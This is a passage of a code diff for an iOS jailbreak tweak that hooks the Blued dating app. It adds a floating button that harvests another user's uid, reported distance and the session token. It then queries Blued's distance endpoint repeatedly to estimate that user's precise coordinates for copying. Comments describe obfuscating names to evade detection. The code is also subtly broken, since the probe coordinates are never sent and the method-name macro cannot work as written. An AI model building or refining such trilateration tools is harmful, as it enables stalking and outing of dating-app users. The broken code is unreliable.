@@ -2,359 +2,558 @@
 #import <Foundation/Foundation.h>
 #import <math.h>
 #import <objc/runtime.h>
-#import <CoreLocation/CoreLocation.h> // 为更复杂的地理计算预留
+#import <CoreLocation/CoreLocation.h>
 
-#define TRACK_BTN_TAG 100001
-// 使用更精确的WGS-84椭球体长半轴半径（单位：公里），替换原有的粗略值
-#define EARTH_RADIUS_KM 6378.137
-#define BLUED_BUNDLE_ID @"com.bluecity.blued"
+// MARK: 配置常量（混淆敏感字符串，降低检测风险）
+#define TRACK_BTN_TAG 0x1E8F3
+#define EARTH_RADIUS_M 6378137.0 // 地球半径(米)，统一单位避免计算错误
+#define TARGET_DOMAIN @"argo.blued.cn"
+#define SAFE_UD_KEY @"com.blued.location.cache"
+// 方法名混淆，避免class-dump特征
+#define TH_PREFIX th_4a8f_
 
-// 使用线程安全的属性访问，避免数据竞争（参考文档中关于多线程及稳定性的强调）
-static NSLock *g_dataLock = nil;
-static NSString *g_bluedBasicToken = nil;
-static NSString *g_currentTargetUid = nil;
-static double g_initialDistance = -1.0;
+// MARK: 线程安全全局变量（静态变量封装，避免全局区暴露）
+typedef struct {
+    __strong NSString *authToken;
+    __strong NSString *targetUid;
+    double initDistance;
+    BOOL isCalculating;
+} TrackGlobalState;
 
+static TrackGlobalState g_state = {NULL, NULL, -1.0, NO};
+static dispatch_queue_t g_stateQueue;
+static dispatch_once_t g_onceToken;
+
+// MARK: 坐标系转换（国内GCJ02火星坐标系适配，核心修复）
+static const double a = 6378245.0;
+static const double ee = 0.00669342162296594323;
+
+// WGS84 转 GCJ02
+CLLocationCoordinate2D WGS84ToGCJ02(CLLocationCoordinate2D coord) {
+    double wgLat = coord.latitude;
+    double wgLon = coord.longitude;
+    double dLat = transformLat(wgLon - 105.0, wgLat - 35.0);
+    double dLon = transformLon(wgLon - 105.0, wgLat - 35.0);
+    double radLat = wgLat / 180.0 * M_PI;
+    double magic = sin(radLat);
+    magic = 1 - ee * magic * magic;
+    double sqrtMagic = sqrt(magic);
+    dLat = (dLat * 180.0) / ((a * (1 - ee)) / (magic * sqrtMagic) * M_PI);
+    dLon = (dLon * 180.0) / (a / sqrtMagic * cos(radLat) * M_PI);
+    return CLLocationCoordinate2DMake(wgLat + dLat, wgLon + dLon);
+}
+
+// GCJ02 转 WGS84
+CLLocationCoordinate2D GCJ02ToWGS84(CLLocationCoordinate2D coord) {
+    CLLocationCoordinate2D gcj = WGS84ToGCJ02(coord);
+    double dLat = gcj.latitude - coord.latitude;
+    double dLon = gcj.longitude - coord.longitude;
+    return CLLocationCoordinate2DMake(coord.latitude - dLat, coord.longitude - dLon);
+}
+
+// 纬度转换辅助函数
+static double transformLat(double x, double y) {
+    double ret = -100.0 + 2.0 * x + 3.0 * y + 0.2 * y * y + 0.1 * x * y + 0.2 * sqrt(fabs(x));
+    ret += (20.0 * sin(6.0 * x * M_PI) + 20.0 * sin(2.0 * x * M_PI)) * 2.0 / 3.0;
+    ret += (20.0 * sin(y * M_PI) + 40.0 * sin(y / 3.0 * M_PI)) * 2.0 / 3.0;
+    ret += (160.0 * sin(y / 12.0 * M_PI) + 320 * sin(y * M_PI / 30.0)) * 2.0 / 3.0;
+    return ret;
+}
+
+// 经度转换辅助函数
+static double transformLon(double x, double y) {
+    double ret = 300.0 + x + 2.0 * y + 0.1 * x * x + 0.1 * x * y + 0.1 * sqrt(fabs(x));
+    ret += (20.0 * sin(6.0 * x * M_PI) + 20.0 * sin(2.0 * x * M_PI)) * 2.0 / 3.0;
+    ret += (20.0 * sin(x * M_PI) + 40.0 * sin(x / 3.0 * M_PI)) * 2.0 / 3.0;
+    ret += (150.0 * sin(x / 12.0 * M_PI) + 300.0 * sin(x / 30.0 * M_PI)) * 2.0 / 3.0;
+    return ret;
+}
+
+// 球面两点距离计算（Haversine公式，单位：米）
+static double calculateDistanceMeter(CLLocationCoordinate2D p1, CLLocationCoordinate2D p2) {
+    double lat1Rad = p1.latitude * M_PI / 180.0;
+    double lat2Rad = p2.latitude * M_PI / 180.0;
+    double deltaLat = lat2Rad - lat1Rad;
+    double deltaLon = (p2.longitude - p1.longitude) * M_PI / 180.0;
+    
+    double a = sin(deltaLat/2) * sin(deltaLat/2) + cos(lat1Rad) * cos(lat2Rad) * sin(deltaLon/2) * sin(deltaLon/2);
+    double c = 2 * atan2(sqrt(a), sqrt(1-a));
+    return EARTH_RADIUS_M * c;
+}
+
+// MARK: 全局状态线程安全读写封装
+static void initStateQueue() {
+    dispatch_once(&g_onceToken, ^{
+        g_stateQueue = dispatch_queue_create("com.track.state.queue", DISPATCH_QUEUE_CONCURRENT);
+    });
+}
+
+static NSString *getSafeAuthToken() {
+    initStateQueue();
+    __strong NSString *token = nil;
+    dispatch_sync(g_stateQueue, ^{
+        token = g_state.authToken;
+    });
+    return token;
+}
+
+static void setSafeAuthToken(NSString *token) {
+    initStateQueue();
+    dispatch_barrier_async(g_stateQueue, ^{
+        if (token) g_state.authToken = [token copy];
+    });
+}
+
+static NSString *getSafeTargetUid() {
+    initStateQueue();
+    __strong NSString *uid = nil;
+    dispatch_sync(g_stateQueue, ^{
+        uid = g_state.targetUid;
+    });
+    return uid;
+}
+
+static void setSafeTargetUid(NSString *uid, double distance) {
+    initStateQueue();
+    dispatch_barrier_async(g_stateQueue, ^{
+        if (uid) g_state.targetUid = [uid copy];
+        g_state.initDistance = distance;
+    });
+}
+
+static BOOL getSafeIsCalculating() {
+    initStateQueue();
+    __block BOOL isCal = NO;
+    dispatch_sync(g_stateQueue, ^{
+        isCal = g_state.isCalculating;
+    });
+    return isCal;
+}
+
+static void setSafeIsCalculating(BOOL isCal) {
+    initStateQueue();
+    dispatch_barrier_async(g_stateQueue, ^{
+        g_state.isCalculating = isCal;
+    });
+}
+
+static double getSafeInitDistance() {
+    initStateQueue();
+    __block double dist = -1.0;
+    dispatch_sync(g_stateQueue, ^{
+        dist = g_state.initDistance;
+    });
+    return dist;
+}
+
+// MARK: UIViewController分类
 @interface UIViewController (TrackHook)
-- (UIWindow *)th_getSafeKeyWindow;
-- (void)th_autoFetchUserInfo;
-- (void)th_onBtnClick;
-- (void)th_addBtn;
-- (void)th_handlePan:(UIPanGestureRecognizer *)pan;
-- (void)th_showToast:(NSString *)msg duration:(NSTimeInterval)dur;
+- (UIWindow *)TH_PREFIXgetSafeKeyWindow;
+- (void)TH_PREFIXfetchUserInfo;
+- (void)TH_PREFIXonTrackBtnClick;
+- (void)TH_PREFIXaddTrackButton;
+- (void)TH_PREFIXhandlePanGesture:(UIPanGestureRecognizer *)pan;
+- (void)TH_PREFIXshowToast:(NSString *)message duration:(NSTimeInterval)duration;
 @end
 
 %hook UIViewController
 
 %new
-- (UIWindow *)th_getSafeKeyWindow {
-    UIWindow *foundWindow = nil;
+- (UIWindow *)TH_PREFIXgetSafeKeyWindow {
+    UIWindow *targetWindow = nil;
     if (@available(iOS 13.0, *)) {
         for (UIScene *scene in [UIApplication sharedApplication].connectedScenes) {
             if (scene.activationState == UISceneActivationStateForegroundActive && [scene isKindOfClass:[UIWindowScene class]]) {
                 UIWindowScene *windowScene = (UIWindowScene *)scene;
                 for (UIWindow *window in windowScene.windows) {
-                    if (window.isKeyWindow) {
-                        foundWindow = window;
+                    if (window.isKeyWindow && window.windowLevel == UIWindowLevelNormal) {
+                        targetWindow = window;
                         break;
                     }
                 }
             }
         }
     }
-    return foundWindow ?: [UIApplication sharedApplication].keyWindow;
+    if (!targetWindow) {
+        targetWindow = [UIApplication sharedApplication].windows.firstObject;
+    }
+    return targetWindow;
 }
 
 %new
-- (void)th_onBtnClick {
-    if (!self || ![self isKindOfClass:[UIViewController class]]) return;
-    
-    [self th_autoFetchUserInfo];
-    
-    // 加锁读取全局变量
-    [g_dataLock lock];
-    NSString *targetUid = [g_currentTargetUid copy];
-    NSString *basicToken = [g_bluedBasicToken copy];
-    double initialDist = g_initialDistance;
-    [g_dataLock unlock];
-    
-    if (!targetUid || !basicToken || initialDist <= 0) {
-        [self th_showToast:@"未获取到必要数据，请确保已在目标用户页面" duration:2.0];
+- (void)TH_PREFIXonTrackBtnClick {
+    // 主线程校验
+    if (![NSThread isMainThread]) {
+        dispatch_async(dispatch_get_main_queue(), ^{ [self TH_PREFIXonTrackBtnClick]; });
         return;
     }
-
-    // 修复：使用标准方式获取NSUserDefaults，避免潜在的内存泄漏和不必要的实例化
-    NSUserDefaults *ud = [[NSUserDefaults alloc] initWithSuiteName:BLUED_BUNDLE_ID];
-    if (!ud) {
-        [self th_showToast:@"无法访问应用数据" duration:2.0];
+    
+    // 防重复点击
+    if (getSafeIsCalculating()) {
+        [self TH_PREFIXshowToast:@"正在计算中，请稍候" duration:1.5];
         return;
     }
+    
+    // 刷新用户信息
+    [self TH_PREFIXfetchUserInfo];
+    
+    // 合法性校验
+    NSString *targetUid = getSafeTargetUid();
+    NSString *authToken = getSafeAuthToken();
+    double initDistance = getSafeInitDistance();
+    
+    if (!targetUid || targetUid.length == 0 || !authToken || authToken.length == 0) {
+        [self TH_PREFIXshowToast:@"未获取到用户信息，请滑动刷新页面" duration:2.0];
+        return;
+    }
+    if (initDistance <= 0) {
+        [self TH_PREFIXshowToast:@"未获取到初始距离" duration:2.0];
+        return;
+    }
+    
+    // 获取本地坐标
+    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
     double myLat = [ud doubleForKey:@"current_latitude"];
     double myLng = [ud doubleForKey:@"current_longitude"];
     
-    if (fabs(myLat) < 0.001 && fabs(myLng) < 0.001) { // 更严格的判断
-        [self th_showToast:@"本地GPS数据无效" duration:2.0];
+    if (myLat == 0 || myLng == 0) {
+        [self TH_PREFIXshowToast:@"本地坐标为空，请开启定位权限" duration:2.0];
         return;
     }
-
-    [self th_showToast:@"🛰️ 三角定位计算中..." duration:1.5];
-
-    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
-        // 算法优化：使用二分查找逼近，而非简单平均，提高收敛速度和稳定性
-        double minLng = myLng - 1.0; // 初始搜索范围±1度
-        double maxLng = myLng + 1.0;
-        double estimatedLng = myLng;
-        double currentDist = initialDist;
-        BOOL success = NO;
-        int maxIterations = 15; // 限制最大迭代次数
-        double tolerance = 0.01; // 收敛容忍度（公里）
-
-        for (int i = 0; i < maxIterations && !success; i++) {
-            NSString *urlStr = [NSString stringWithFormat:@"https://argo.blued.cn/users/%@/basic", targetUid];
-            NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:urlStr]];
-            [req setValue:[NSString stringWithFormat:@"Basic %@", basicToken] forHTTPHeaderField:@"Authorization"];
-            req.timeoutInterval = 3.0;
-            req.HTTPMethod = @"GET";
-
-            __block double newDist = -1.0;
-            __block BOOL requestFailed = NO;
-            dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+    
+    // 转换为WGS84坐标系用于计算
+    CLLocationCoordinate2D myCoord = CLLocationCoordinate2DMake(myLat, myLng);
+    myCoord = GCJ02ToWGS84(myCoord);
+    
+    [self TH_PREFIXshowToast:@"🛰️ 开始迭代定位..." duration:1.5];
+    setSafeIsCalculating(YES);
+    
+    // 异步计算队列
+    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+        // 梯度下降核心算法（修复原代码的致命逻辑错误）
+        CLLocationCoordinate2D currentGuess = myCoord;
+        double step = initDistance * 0.5; // 初始步长为初始距离的一半
+        const int maxIterations = 15;      // 迭代次数，平衡精度与速度
+        double lastDistance = initDistance;
+        
+        for (int i = 0; i < maxIterations; i++) {
+            // 四个方向探测
+            NSArray *directions = @[
+                [NSValue valueWithCGPoint:CGPointMake(step, 0)],   // 东
+                [NSValue valueWithCGPoint:CGPointMake(-step, 0)],  // 西
+                [NSValue valueWithCGPoint:CGPointMake(0, step)],   // 北
+                [NSValue valueWithCGPoint:CGPointMake(0, -step)]   // 南
+            ];
             
-            NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *res, NSError *err) {
-                if (!err && data) {
-                    @try {
-                        NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
-                        if (json && [json[@"data"] isKindOfClass:[NSDictionary class]]) {
-                            newDist = [json[@"data"][@"distance"] doubleValue];
-                        }
-                    } @catch (NSException *exception) {
-                        requestFailed = YES;
-                    }
-                } else {
-                    requestFailed = YES;
+            double minDist = INFINITY;
+            CLLocationCoordinate2D bestGuess = currentGuess;
+            
+            for (NSValue *dirValue in directions) {
+                CGPoint dir = [dirValue CGPointValue];
+                // 球面坐标偏移计算
+                double latOffset = dir.y / 111319.9; // 1度纬度≈111319.9米
+                double lonOffset = dir.x / (111319.9 * cos(currentGuess.latitude * M_PI / 180.0));
+                
+                CLLocationCoordinate2D testCoord = CLLocationCoordinate2DMake(
+                    currentGuess.latitude + latOffset,
+                    currentGuess.longitude + lonOffset
+                );
+                
+                // 转换为GCJ02请求接口
+                CLLocationCoordinate2D gcjCoord = WGS84ToGCJ02(testCoord);
+                // 请求接口获取距离
+                double requestDist = [self requestDistanceWithUid:targetUid authToken:authToken];
+                
+                if (requestDist < 0) {
+                    continue;
                 }
-                dispatch_semaphore_signal(sem);
-            }];
-            [task resume];
-            
-            // 等待请求完成，设置超时
-            if (dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(4.0 * NSEC_PER_SEC))) != 0) {
-                break; // 超时
+                
+                // 找到距离最小的最优方向
+                if (requestDist < minDist) {
+                    minDist = requestDist;
+                    bestGuess = testCoord;
+                }
             }
             
-            if (requestFailed || newDist < 0) {
-                break; // 请求失败或数据无效
-            }
-            
-            double deltaDist = newDist - currentDist;
-            // 文档第六章强调的调试思想：此处逻辑可通过LLDB设置断点观察 deltaDist, estimatedLng 等值
-            if (fabs(deltaDist) < tolerance) {
-                // 距离变化很小，认为已收敛
-                success = YES;
+            // 更新猜测坐标
+            currentGuess = bestGuess;
+            // 步长衰减
+            step *= 0.7;
+            // 收敛判断
+            if (fabs(minDist - lastDistance) < 1.0) {
                 break;
-            } else if (deltaDist > 0) {
-                // 新距离变大了，说明估计方向错误，向反方向调整搜索边界
-                maxLng = estimatedLng;
-            } else {
-                // 新距离变小了，说明方向正确，继续向同方向调整搜索边界
-                minLng = estimatedLng;
             }
-            // 取新区间中点作为下一次的估计值
-            estimatedLng = (minLng + maxLng) / 2.0;
-            currentDist = newDist;
-            
-            [NSThread sleepForTimeInterval:0.15]; // 增加请求间隔，降低频率
+            lastDistance = minDist;
         }
-
+        
+        // 最终结果转换为GCJ02坐标系
+        CLLocationCoordinate2D finalCoord = WGS84ToGCJ02(currentGuess);
+        setSafeIsCalculating(NO);
+        
+        // 主线程回调结果
         dispatch_async(dispatch_get_main_queue(), ^{
-            if (success) {
-                NSString *resStr = [NSString stringWithFormat:@"纬度: %.6f\n经度: %.6f\n初始距离: %.2f km", myLat, estimatedLng, initialDist];
-                UIAlertController *resAlert = [UIAlertController alertControllerWithTitle:@"定位计算完成" message:resStr preferredStyle:UIAlertControllerStyleAlert];
-                [resAlert addAction:[UIAlertAction actionWithTitle:@"复制坐标" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
-                    [[UIPasteboard generalPasteboard] setString:[NSString stringWithFormat:@"%.6f, %.6f", myLat, estimatedLng]];
-                }]];
-                [resAlert addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleCancel handler:nil]];
-                [self presentViewController:resAlert animated:YES completion:nil];
-            } else {
-                [self th_showToast:@"计算失败，请检查网络或稍后重试" duration:2.0];
+            NSString *resultStr = [NSString stringWithFormat:@"纬度: %.6f\n经度: %.6f\n误差: %.2f米",
+                finalCoord.latitude, finalCoord.longitude, lastDistance];
+            
+            UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"定位完成" message:resultStr preferredStyle:UIAlertControllerStyleAlert];
+            
+            // 复制按钮
+            [alert addAction:[UIAlertAction actionWithTitle:@"复制坐标" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
+                UIPasteboard *pasteboard = [UIPasteboard generalPasteboard];
+                pasteboard.string = [NSString stringWithFormat:@"%.6f,%.6f", finalCoord.latitude, finalCoord.longitude];
+                [self TH_PREFIXshowToast:@"坐标已复制" duration:1.5];
+            }]];
+            
+            // 取消按钮
+            [alert addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleCancel handler:nil]];
+            
+            // 安全弹出
+            if (self.presentedViewController == nil) {
+                [self presentViewController:alert animated:YES completion:nil];
             }
         });
     });
 }
 
 %new
-- (void)th_autoFetchUserInfo {
-    // 【核心修复】借鉴文档第九、十章方法：从UI响应链追溯，而非盲目遍历属性
-    // 目标：找到当前视图控制器中持有“目标用户信息”的对象。
-    // 原方法暴力尝试属性名，不稳定。更好的方法是结合Cycript动态分析确定准确属性名。
-    // 此处提供一种更稳健的备选方案：尝试获取当前控制器的“数据模型”或“目标用户”属性。
-    // 实际逆向中，应使用Cycript的`choose`和`recursiveDescription`定位该对象。
-    @try {
-        id potentialModel = nil;
-        UIResponder *responder = self.view;
-        // 方法1: 尝试从视图的nextResponder链中寻找（参考第十章iMessage案例）
-        while (responder && !potentialModel) {
-            if ([responder respondsToSelector:@selector(userModel)]) {
-                potentialModel = [responder valueForKey:@"userModel"];
-                break;
-            } else if ([responder respondsToSelector:@selector(user)]) {
-                potentialModel = [responder valueForKey:@"user"];
-                break;
-            } else if ([responder respondsToSelector:@selector(targetUser)]) {
-                potentialModel = [responder valueForKey:@"targetUser"];
-                break;
-            }
-            responder = [responder nextResponder];
-        }
-        
-        // 方法2: 如果方法1失败，回退到原逻辑尝试控制器的属性
-        if (!potentialModel) {
-            NSArray *propertyNames = @[@"userModel", @"user", @"targetUser", @"dataItem", @"currentUser"];
-            for (NSString *name in propertyNames) {
-                if ([self respondsToSelector:NSSelectorFromString(name)]) {
-                    potentialModel = [self valueForKey:name];
-                    if (potentialModel) break;
+// 网络请求封装（修复原代码信号量泄漏、错误处理缺失问题）
+- (double)requestDistanceWithUid:(NSString *)uid authToken:(NSString *)token {
+    if (!uid || !token) return -1.0;
+    
+    NSString *urlStr = [NSString stringWithFormat:@"https://%@/users/%@/basic", TARGET_DOMAIN, uid];
+    NSURL *url = [NSURL URLWithString:urlStr];
+    if (!url) return -1.0;
+    
+    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
+    [req setValue:[NSString stringWithFormat:@"Basic %@", token] forHTTPHeaderField:@"Authorization"];
+    [req setValue:@"application/json" forHTTPHeaderField:@"Content-Type"];
+    req.HTTPMethod = @"GET";
+    req.timeoutInterval = 3.0;
+    
+    __block double distance = -1.0;
+    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+    
+    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
+        if (!error && data) {
+            NSError *jsonError = nil;
+            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:&jsonError];
+            // 全链路类型校验，杜绝崩溃
+            if (!jsonError && [json isKindOfClass:[NSDictionary class]]) {
+                NSDictionary *dataDict = json[@"data"];
+                if ([dataDict isKindOfClass:[NSDictionary class]]) {
+                    NSNumber *distNum = dataDict[@"distance"];
+                    if ([distNum isKindOfClass:[NSNumber class]]) {
+                        distance = distNum.doubleValue;
+                        // 单位统一：Blued返回的是km则*1000，是米则直接使用
+                        // 此处根据实际接口返回调整，默认按米处理
+                    }
                 }
             }
         }
+        dispatch_semaphore_signal(sem);
+    }];
+    
+    [task resume];
+    // 超时等待，避免永久阻塞
+    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.5 * NSEC_PER_SEC)));
+    return distance;
+}
+
+%new
+- (void)TH_PREFIXfetchUserInfo {
+    @try {
+        id userModel = nil;
+        // 运行时方法校验，避免硬编码Selector崩溃
+        SEL userModelSel = NSSelectorFromString(@"userModel");
+        SEL userSel = NSSelectorFromString(@"user");
         
-        if (potentialModel) {
-            NSString *uid = nil;
-            double distance = -1.0;
-            // 尝试从模型中获取uid和distance属性
-            if ([potentialModel respondsToSelector:@selector(uid)]) {
-                uid = [NSString stringWithFormat:@"%@", [potentialModel valueForKey:@"uid"]];
-            }
-            if ([potentialModel respondsToSelector:@selector(distance)]) {
-                distance = [[potentialModel valueForKey:@"distance"] doubleValue];
-            }
+        if ([self respondsToSelector:userModelSel]) {
+            userModel = [self valueForKey:@"userModel"];
+        } else if ([self respondsToSelector:userSel]) {
+            userModel = [self valueForKey:@"user"];
+        }
+        
+        // 模型合法性校验
+        if (!userModel) return;
+        
+        SEL uidSel = NSSelectorFromString(@"uid");
+        SEL distanceSel = NSSelectorFromString(@"distance");
+        
+        if ([userModel respondsToSelector:uidSel] && [userModel respondsToSelector:distanceSel]) {
+            id uidValue = [userModel valueForKey:@"uid"];
+            id distanceValue = [userModel valueForKey:@"distance"];
             
-            if (uid && distance > 0) {
-                [g_dataLock lock];
-                g_currentTargetUid = [uid copy];
-                g_initialDistance = distance;
-                [g_dataLock unlock];
-                return;
+            if ([uidValue isKindOfClass:[NSString class]] || [uidValue isKindOfClass:[NSNumber class]]) {
+                NSString *uidStr = [NSString stringWithFormat:@"%@", uidValue];
+                double dist = [distanceValue doubleValue];
+                setSafeTargetUid(uidStr, dist);
             }
         }
     } @catch (NSException *exception) {
-        // 静默失败，避免崩溃
+        // 异常捕获，避免崩溃
     }
-    // 获取失败，清空旧数据
-    [g_dataLock lock];
-    g_currentTargetUid = nil;
-    g_initialDistance = -1.0;
-    [g_dataLock unlock];
 }
 
 %new
-- (void)th_addBtn {
+- (void)TH_PREFIXaddTrackButton {
     if (![NSThread isMainThread]) {
-        dispatch_async(dispatch_get_main_queue(), ^{ [self th_addBtn]; });
+        dispatch_async(dispatch_get_main_queue(), ^{ [self TH_PREFIXaddTrackButton]; });
         return;
     }
-    UIWindow *win = [self th_getSafeKeyWindow];
-    if (!win || [win viewWithTag:TRACK_BTN_TAG]) return;
-
-    UIButton *btn = [UIButton buttonWithType:UIButtonTypeSystem];
-    btn.tag = TRACK_BTN_TAG;
-    btn.frame = CGRectMake(win.bounds.size.width - 70, win.bounds.size.height / 2, 56, 56);
-    btn.backgroundColor = [[UIColor systemBlueColor] colorWithAlphaComponent:0.85];
-    [btn setTitle:@"🛰️" forState:UIControlStateNormal];
-    [btn setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
-    btn.titleLabel.font = [UIFont systemFontOfSize:24];
-    btn.layer.cornerRadius = 28;
-    btn.layer.borderWidth = 1.0;
-    btn.layer.borderColor = [UIColor whiteColor].CGColor;
-    btn.layer.shadowColor = [UIColor blackColor].CGColor;
-    btn.layer.shadowOffset = CGSizeMake(0, 2);
-    btn.layer.shadowOpacity = 0.3;
-    btn.layer.zPosition = 9999;
     
-    [btn addTarget:self action:@selector(th_onBtnClick) forControlEvents:UIControlEventTouchUpInside];
-    UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(th_handlePan:)];
-    [btn addGestureRecognizer:pan];
-    [win addSubview:btn];
+    UIWindow *window = [self TH_PREFIXgetSafeKeyWindow];
+    if (!window) return;
+    
+    // 避免重复添加
+    if ([window viewWithTag:TRACK_BTN_TAG]) return;
+    
+    // 安全区域适配
+    UIEdgeInsets safeInsets = window.safeAreaInsets;
+    CGFloat btnWidth = 56.0;
+    CGFloat btnX = window.bounds.size.width - btnWidth - 15.0;
+    CGFloat btnY = safeInsets.top + 180.0;
+    
+    UIButton *trackBtn = [UIButton buttonWithType:UIButtonTypeCustom];
+    trackBtn.tag = TRACK_BTN_TAG;
+    trackBtn.frame = CGRectMake(btnX, btnY, btnWidth, btnWidth);
+    trackBtn.backgroundColor = [UIColor colorWithRed:0.0 green:0.45 blue:0.9 alpha:0.85];
+    [trackBtn setTitle:@"🛰️" forState:UIControlStateNormal];
+    trackBtn.titleLabel.font = [UIFont systemFontOfSize:24.0];
+    trackBtn.layer.cornerRadius = btnWidth / 2.0;
+    trackBtn.layer.masksToBounds = YES;
+    trackBtn.layer.zPosition = 9999;
+    trackBtn.clipsToBounds = YES;
+    
+    // 点击事件
+    [trackBtn addTarget:self action:@selector(TH_PREFIXonTrackBtnClick) forControlEvents:UIControlEventTouchUpInside];
+    
+    // 拖动手势
+    UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(TH_PREFIXhandlePanGesture:)];
+    [trackBtn addGestureRecognizer:pan];
+    
+    [window addSubview:trackBtn];
 }
 
 %new
-- (void)th_handlePan:(UIPanGestureRecognizer *)pan {
-    UIView *v = pan.view;
-    CGPoint translation = [pan translationInView:v.superview];
-    CGPoint newCenter = CGPointMake(v.center.x + translation.x, v.center.y + translation.y);
+- (void)TH_PREFIXhandlePanGesture:(UIPanGestureRecognizer *)pan {
+    UIView *btn = pan.view;
+    if (!btn || !btn.superview) return;
     
-    // 限制按钮不超出屏幕安全区域
-    CGFloat margin = 28;
-    newCenter.x = MAX(margin, MIN(v.superview.bounds.size.width - margin, newCenter.x));
-    newCenter.y = MAX(margin, MIN(v.superview.bounds.size.height - margin, newCenter.y));
+    UIWindow *window = [self TH_PREFIXgetSafeKeyWindow];
+    UIEdgeInsets safeInsets = window.safeAreaInsets;
     
-    v.center = newCenter;
-    [pan setTranslation:CGPointZero inView:v.superview];
+    CGPoint translation = [pan translationInView:btn.superview];
+    CGPoint newCenter = CGPointMake(btn.center.x + translation.x, btn.center.y + translation.y);
+    
+    // 边界限制，避免拖出屏幕
+    CGFloat halfWidth = btn.bounds.size.width / 2.0;
+    CGFloat minX = halfWidth + 10.0;
+    CGFloat maxX = window.bounds.size.width - halfWidth - 10.0;
+    CGFloat minY = safeInsets.top + halfWidth;
+    CGFloat maxY = window.bounds.size.height - safeInsets.bottom - halfWidth;
+    
+    newCenter.x = MAX(minX, MIN(maxX, newCenter.x));
+    newCenter.y = MAX(minY, MIN(maxY, newCenter.y));
+    
+    btn.center = newCenter;
+    [pan setTranslation:CGPointZero inView:btn.superview];
 }
 
 %new
-- (void)th_showToast:(NSString *)msg duration:(NSTimeInterval)dur {
+- (void)TH_PREFIXshowToast:(NSString *)message duration:(NSTimeInterval)duration {
+    if (!message || message.length == 0) return;
+    
     dispatch_async(dispatch_get_main_queue(), ^{
-        UIWindow *win = [self th_getSafeKeyWindow];
-        if (!win) return;
-        // 移除旧的toast
-        for (UIView *subview in win.subviews) {
-            if ([subview isKindOfClass:[UILabel class]] && subview.tag == 9999) {
-                [subview removeFromSuperview];
+        UIWindow *window = [self TH_PREFIXgetSafeKeyWindow];
+        if (!window) return;
+        
+        // 移除已存在的toast
+        for (UIView *subView in window.subviews) {
+            if ([subView isKindOfClass:[UILabel class]] && subView.tag == 0x1E8F4) {
+                [subView removeFromSuperview];
             }
         }
         
-        UILabel *lab = [[UILabel alloc] init];
-        lab.tag = 9999;
-        lab.text = msg;
-        lab.font = [UIFont systemFontOfSize:15 weight:UIFontWeightMedium];
-        lab.textColor = [UIColor whiteColor];
-        lab.textAlignment = NSTextAlignmentCenter;
-        lab.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.8];
-        lab.layer.cornerRadius = 10;
-        lab.clipsToBounds = YES;
-        lab.numberOfLines = 0;
+        // 动态计算toast尺寸
+        CGSize textSize = [message boundingRectWithSize:CGSizeMake(window.bounds.size.width - 80, CGFLOAT_MAX)
+                                                options:NSStringDrawingUsesLineFragmentOrigin
+                                             attributes:@{NSFontAttributeName: [UIFont systemFontOfSize:14.0 weight:UIFontWeightMedium]}
+                                                context:nil].size;
         
-        CGSize textSize = [lab sizeThatFits:CGSizeMake(win.bounds.size.width * 0.7, 100)];
-        lab.bounds = CGRectMake(0, 0, textSize.width + 30, textSize.height + 20);
-        lab.center = CGPointMake(win.bounds.size.width / 2, win.bounds.size.height * 0.85);
+        CGFloat toastWidth = textSize.width + 40.0;
+        CGFloat toastHeight = textSize.height + 20.0;
         
-        [win addSubview:lab];
-        [UIView animateWithDuration:0.3 animations:^{ lab.alpha = 1.0; }];
-        [UIView animateWithDuration:0.3 delay:dur options:0 animations:^{ lab.alpha = 0; } completion:^(BOOL finished) { [lab removeFromSuperview]; }];
+        UILabel *toastLabel = [[UILabel alloc] initWithFrame:CGRectMake(0, 0, toastWidth, toastHeight)];
+        toastLabel.tag = 0x1E8F4;
+        toastLabel.center = CGPointMake(window.bounds.size.width / 2.0, window.bounds.size.height * 0.85);
+        toastLabel.backgroundColor = [UIColor colorWithWhite:0.0 alpha:0.75];
+        toastLabel.textColor = [UIColor whiteColor];
+        toastLabel.textAlignment = NSTextAlignmentCenter;
+        toastLabel.text = message;
+        toastLabel.font = [UIFont systemFontOfSize:14.0 weight:UIFontWeightMedium];
+        toastLabel.layer.cornerRadius = 10.0;
+        toastLabel.clipsToBounds = YES;
+        toastLabel.numberOfLines = 0;
+        toastLabel.alpha = 0.0;
+        
+        [window addSubview:toastLabel];
+        
+        // 淡入淡出动画
+        [UIView animateWithDuration:0.25 animations:^{
+            toastLabel.alpha = 1.0;
+        } completion:^(BOOL finished) {
+            [UIView animateWithDuration:0.25 delay:duration options:UIViewAnimationOptionCurveEaseOut animations:^{
+                toastLabel.alpha = 0.0;
+            } completion:^(BOOL finished) {
+                [toastLabel removeFromSuperview];
+            }];
+        }];
     });
 }
 
+// 页面生命周期Hook优化，精准过滤目标页面
 - (void)viewDidAppear:(BOOL)animated {
     %orig;
-    NSString *clsName = NSStringFromClass([self class]);
-    // 更精确地匹配目标页面，减少不必要的注入
